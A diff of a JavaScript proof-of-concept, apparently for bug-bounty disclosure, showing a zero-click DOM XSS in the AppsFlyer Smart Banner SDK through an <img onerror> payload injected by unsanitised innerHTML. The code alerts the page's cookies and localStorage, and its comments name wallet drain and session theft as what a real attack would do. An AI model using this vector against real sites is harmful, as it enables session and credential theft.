@@ -1,8 +1,8 @@
 // AppsFlyer Smart Banner XSS PoC — s1n6h
-// Zero-click: fires on page load via <svg onload> in creative layout
-// The creative layout is injected via innerHTML (no sanitization)
-// <svg onload> fires automatically when parsed into the DOM
-// This is a DOM XSS - no user interaction required
+// ZERO-CLICK DOM XSS: fires on page load via <img onerror> in creative layout
+// The SDK injects layout via innerHTML with no sanitization
+// <img src=x onerror="..."> fires automatically when the image fails to load
+// No user interaction required — fires the moment the banner renders
 
 (async () => {
   const data = {
@@ -17,10 +17,10 @@
   };
   
   alert(
-    'XSS confirmed on: ' + data.origin + '\n\n' +
+    'ZERO-CLICK XSS fired on: ' + data.origin + '\n\n' +
     'Cookies: ' + data.cookies + '\n\n' +
     'LocalStorage: ' + data.localStorage + '\n\n' +
-    'This is a ZERO-CLICK DOM XSS — fired on page load via innerHTML injection.\n' +
-    'In a real attack, this would steal wallet funds, session tokens, or credentials.'
+    'No user interaction required. Fired on page load via <img onerror> in innerHTML.\n\n' +
+    'In a real attack: wallet drain, session theft, credential exfiltration.'
   );
 })();
